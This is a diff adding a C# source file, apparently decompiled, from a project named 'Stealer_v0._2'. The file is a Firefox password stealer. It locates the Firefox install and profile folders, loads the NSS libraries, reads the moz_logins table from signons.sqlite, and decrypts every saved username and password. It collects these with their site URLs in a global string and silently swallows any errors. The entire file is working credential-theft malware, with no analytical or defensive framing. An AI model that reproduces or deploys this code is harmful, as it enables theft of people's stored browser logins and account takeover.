@@ -1,0 +1,250 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Text.RegularExpressions;
+using Microsoft.VisualBasic.CompilerServices;
+using Microsoft.Win32;
+
+namespace Stealer_v0._2
+{
+
+	[StandardModule]
+	internal sealed class FF
+	{
+
+		[DllImport("kernel32.dll")]
+		private static extern IntPtr LoadLibrary(string dllFilePath);
+
+
+		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+
+		public static long NSS_Init(string configdir)
+		{
+			string str = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Mozilla\\Mozilla Firefox", "CurrentVersion", "error"));
+			string str2 = Conversions.ToString(Operators.ConcatenateObject(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Mozilla\\Mozilla Firefox\\" + str + "\\Main", "Install Directory", "error"), "\\"));
+			FF.LoadLibrary(str2 + "mozcrt19.dll");
+			FF.LoadLibrary(str2 + "nspr4.dll");
+			FF.LoadLibrary(str2 + "plc4.dll");
+			FF.LoadLibrary(str2 + "plds4.dll");
+			FF.LoadLibrary(str2 + "ssutil3.dll");
+			FF.LoadLibrary(str2 + "sqlite3.dll");
+			FF.LoadLibrary(str2 + "nssutil3.dll");
+			FF.LoadLibrary(str2 + "softokn3.dll");
+			FF.NSS3 = FF.LoadLibrary(str2 + "nss3.dll");
+			IntPtr procAddress = FF.GetProcAddress(FF.NSS3, "NSS_Init");
+			FF.DLLFunctionDelegate dllfunctionDelegate = (FF.DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FF.DLLFunctionDelegate));
+			return dllfunctionDelegate(configdir);
+		}
+
+
+		public static long PK11_GetInternalKeySlot()
+		{
+			IntPtr procAddress = FF.GetProcAddress(FF.NSS3, "PK11_GetInternalKeySlot");
+			FF.DLLFunctionDelegate2 dllfunctionDelegate = (FF.DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FF.DLLFunctionDelegate2));
+			return dllfunctionDelegate();
+		}
+
+
+		public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
+		{
+			IntPtr procAddress = FF.GetProcAddress(FF.NSS3, "PK11_Authenticate");
+			FF.DLLFunctionDelegate3 dllfunctionDelegate = (FF.DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FF.DLLFunctionDelegate3));
+			return dllfunctionDelegate(slot, loadCerts, wincx);
+		}
+
+
+		public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
+		{
+			IntPtr procAddress = FF.GetProcAddress(FF.NSS3, "NSSBase64_DecodeBuffer");
+			FF.DLLFunctionDelegate4 dllfunctionDelegate = (FF.DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FF.DLLFunctionDelegate4));
+			return dllfunctionDelegate(arenaOpt, outItemOpt, inStr, inLen);
+		}
+
+		public static int PK11SDR_Decrypt(ref FF.TSECItem data, ref FF.TSECItem result, int cx)
+		{
+			IntPtr procAddress = FF.GetProcAddress(FF.NSS3, "PK11SDR_Decrypt");
+			FF.DLLFunctionDelegate5 dllfunctionDelegate = (FF.DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FF.DLLFunctionDelegate5));
+			return dllfunctionDelegate(ref data, ref result, cx);
+		}
+
+		public static void FF_Recovery()
+		{
+			checked
+			{
+				try
+				{
+					bool flag = false;
+					string str = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Mozilla\\Mozilla Firefox", "CurrentVersion", "error"));
+					string text = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Mozilla\\Mozilla Firefox\\" + str + "\\Main", "Install Directory", "error"));
+					string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
+					string[] directories = Directory.GetDirectories(path);
+					foreach (string text2 in directories)
+					{
+						bool flag2 = !flag;
+						if (!flag2)
+						{
+							break;
+						}
+						string[] files = Directory.GetFiles(text2);
+						foreach (string input in files)
+						{
+							flag2 = !flag;
+							if (!flag2)
+							{
+								break;
+							}
+							bool flag3 = Regex.IsMatch(input, "signons.sqlite");
+							if (flag3)
+							{
+								FF.NSS_Init(text2);
+								FF.signon = input;
+							}
+						}
+					}
+					string baseName = FF.signon;
+					FF.TSECItem tsecitem = default(FF.TSECItem);
+					FF.TSECItem tsecitem2 = default(FF.TSECItem);
+					FF.TSECItem tsecitem3 = default(FF.TSECItem);
+					SQLiteHandler sqliteHandler = new SQLiteHandler(baseName);
+					sqliteHandler.ReadTable("moz_logins");
+					long slot = FF.PK11_GetInternalKeySlot();
+					FF.PK11_Authenticate(slot, true, 0L);
+					string text3 = "";
+					string text4 = "";
+					int num = 0;
+					int num2 = sqliteHandler.GetRowCount() - 1;
+					int num3 = num;
+					for (;;)
+					{
+						int num4 = num3;
+						int num5 = num2;
+						if (num4 > num5)
+						{
+							break;
+						}
+						string value = sqliteHandler.GetValue(num3, "formSubmitURL");
+						StringBuilder stringBuilder = new StringBuilder(sqliteHandler.GetValue(num3, "encryptedUsername").ToString());
+						int value2 = FF.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
+						IntPtr intPtr = new IntPtr(value2);
+						FF.TSECItem tsecitem4 = (FF.TSECItem)Marshal.PtrToStructure(intPtr, typeof(FF.TSECItem));
+						bool flag3 = FF.PK11SDR_Decrypt(ref tsecitem4, ref tsecitem2, 0) == 0;
+						if (flag3)
+						{
+							bool flag2 = tsecitem2.SECItemLen != 0;
+							if (flag2)
+							{
+								byte[] array3 = new byte[tsecitem2.SECItemLen - 1 + 1];
+								intPtr = new IntPtr(tsecitem2.SECItemData);
+								Marshal.Copy(intPtr, array3, 0, tsecitem2.SECItemLen);
+								text3 = Encoding.ASCII.GetString(array3);
+							}
+						}
+						StringBuilder stringBuilder2 = new StringBuilder(sqliteHandler.GetValue(num3, "encryptedPassword").ToString());
+						int value3 = FF.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
+						intPtr = new IntPtr(value3);
+						FF.TSECItem tsecitem5 = (FF.TSECItem)Marshal.PtrToStructure(intPtr, typeof(FF.TSECItem));
+						flag3 = (FF.PK11SDR_Decrypt(ref tsecitem5, ref tsecitem3, 0) == 0);
+						if (flag3)
+						{
+							bool flag2 = tsecitem3.SECItemLen != 0;
+							if (flag2)
+							{
+								byte[] array3 = new byte[tsecitem3.SECItemLen - 1 + 1];
+								intPtr = new IntPtr(tsecitem3.SECItemData);
+								Marshal.Copy(intPtr, array3, 0, tsecitem3.SECItemLen);
+								text4 = Encoding.ASCII.GetString(array3);
+							}
+						}
+						flag3 = (Operators.CompareString(text3, "", false) != 0 & Operators.CompareString(text4, "", false) != 0);
+						if (flag3)
+						{
+							FF.Add(value, text3, text4);
+						}
+						num3++;
+					}
+				}
+				catch (Exception ex)
+				{
+				}
+			}
+		}
+
+
+		private static void Add(string Host, string User, string Password)
+		{
+			Main.Dynp = string.Concat(new string[]
+			{
+				"Host: ",
+				Host,
+				"\r\n User: ",
+				User,
+				"\r\n Password: ",
+				Password,
+				"\r\n"
+			});
+		}
+
+
+		public static IntPtr NSS3;
+
+
+		public static string signon;
+
+
+		public class SHITEMID
+		{
+
+			[DebuggerNonUserCode]
+			public SHITEMID()
+			{
+			}
+
+
+			public static long cb;
+
+			public static byte[] abID;
+		}
+
+
+		public struct TSECItem
+		{
+			// Token: 0x040000D8 RID: 216
+			public int SECItemType;
+
+			// Token: 0x040000D9 RID: 217
+			public int SECItemData;
+
+			// Token: 0x040000DA RID: 218
+			public int SECItemLen;
+		}
+
+		// Token: 0x0200002C RID: 44
+		// (Invoke) Token: 0x06000095 RID: 149
+		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+		public delegate long DLLFunctionDelegate(string configdir);
+
+		// Token: 0x0200002D RID: 45
+		// (Invoke) Token: 0x06000099 RID: 153
+		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+		public delegate long DLLFunctionDelegate2();
+
+		// Token: 0x0200002E RID: 46
+		// (Invoke) Token: 0x0600009D RID: 157
+		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+		public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);
+
+		// Token: 0x0200002F RID: 47
+		// (Invoke) Token: 0x060000A1 RID: 161
+		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+		public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
+
+		// Token: 0x02000030 RID: 48
+		// (Invoke) Token: 0x060000A5 RID: 165
+		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+		public delegate int DLLFunctionDelegate5(ref FF.TSECItem data, ref FF.TSECItem result, int cx);
+	}
+}
